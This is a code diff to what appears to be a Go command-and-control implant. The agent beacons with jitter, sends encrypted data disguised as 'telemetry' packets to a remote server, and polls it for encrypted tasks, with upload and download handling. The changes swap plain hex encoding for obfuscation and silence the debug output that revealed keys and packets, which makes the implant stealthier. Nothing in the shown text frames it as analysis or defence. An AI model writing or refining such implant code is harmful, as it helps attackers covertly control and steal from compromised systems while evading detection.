@@ -124,7 +124,7 @@ func getSleepTime(sleep int, jitter int) time.Duration {
 
 func sendDataHttp(urlStr string, encryptedData []byte) ([]byte, error) {
 	// 1. Wrap in JSON
-	payload := hex.EncodeToString(encryptedData)
+	payload := utils.Obfuscate(encryptedData)
 	packet := TelemetryPacket{
 		Timestamp: time.Now().Unix(),
 		Status:    "active",
@@ -160,8 +160,6 @@ func sendDataHttp(urlStr string, encryptedData []byte) ([]byte, error) {
 			req.Header.Set(profile.HeaderName, headerVal)
 			// fmt.Printf("[AGENT DEBUG] Header Set: %s = %s\n", profile.HeaderName, headerVal)
 		}
-	} else {
-		// fmt.Printf("[AGENT DEBUG] Header NOT Set. Name: '%s', ID: %d\n", profile.HeaderName, AgentId)
 	}
 
 	// 3. Configure Client (SSL)
@@ -181,13 +179,13 @@ func sendDataHttp(urlStr string, encryptedData []byte) ([]byte, error) {
 	// 4. Send
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Printf("[AGENT DEBUG] Request Failed: %v\n", err)
+		// fmt.Printf("[AGENT DEBUG] Request Failed: %v\n", err)
 		return nil, err
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != 200 {
-		fmt.Printf("[AGENT DEBUG] Server returned status: %d\n", resp.StatusCode)
+		// fmt.Printf("[AGENT DEBUG] Server returned status: %d\n", resp.StatusCode)
 		return nil, fmt.Errorf("server returned status: %d", resp.StatusCode)
 	}
 
@@ -210,7 +208,7 @@ func main() {
 		key := make([]byte, 16)
 		copy(key, encProfile[:16])
 
-		fmt.Printf("[AGENT DEBUG] Loaded Key: %x\n", key)
+		// fmt.Printf("[AGENT DEBUG] Loaded Key: %x\n", key)
 
 		encData := encProfile[16:]
 		decData, err := utils.DecryptData(encData, key)
@@ -250,7 +248,7 @@ func main() {
 	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
 	initMsg, _ = utils.EncryptData(initMsg, encKey)
 
-	fmt.Printf("[AGENT DEBUG] Init Packet (Hex): %s\n", hex.EncodeToString(initMsg))
+	// fmt.Printf("[AGENT DEBUG] Init Packet (Hex): %s\n", hex.EncodeToString(initMsg))
 
 	UPLOADS = make(map[string][]byte)
 	DOWNLOADS = make(map[string]utils.Connection)
@@ -299,7 +297,7 @@ func main() {
 			}
 
 			// 2. Polling Loop
-			fmt.Printf("[AGENT DEBUG] Entering Polling Loop. Target: %s\n", targetUrl)
+			// fmt.Printf("[AGENT DEBUG] Entering Polling Loop. Target: %s\n", targetUrl)
 
 			// Initial Heartbeat
 			outMessage := utils.Message{Type: 0}
@@ -315,7 +313,7 @@ func main() {
 				// Send and Receive
 				respData, err := sendDataHttp(targetUrl, encData)
 				if err != nil {
-					fmt.Printf("[AGENT DEBUG] Request Failed: %v\n", err)
+					// fmt.Printf("[AGENT DEBUG] Request Failed: %v\n", err)
 					break // Connection broken, try next address
 				}
 
@@ -323,8 +321,8 @@ func main() {
 				if len(respData) > 0 {
 					var packet TelemetryPacket
 					if err := json.Unmarshal(respData, &packet); err == nil && len(packet.Payload) > 0 {
-						// Hex Decode
-						encTask, err := hex.DecodeString(packet.Payload)
+						// Deobfuscate
+						encTask, err := utils.Deobfuscate(packet.Payload)
 						if err == nil {
 							// Decrypt with Session Key
 							taskBytes, err := utils.DecryptData(encTask, utils.SKey)
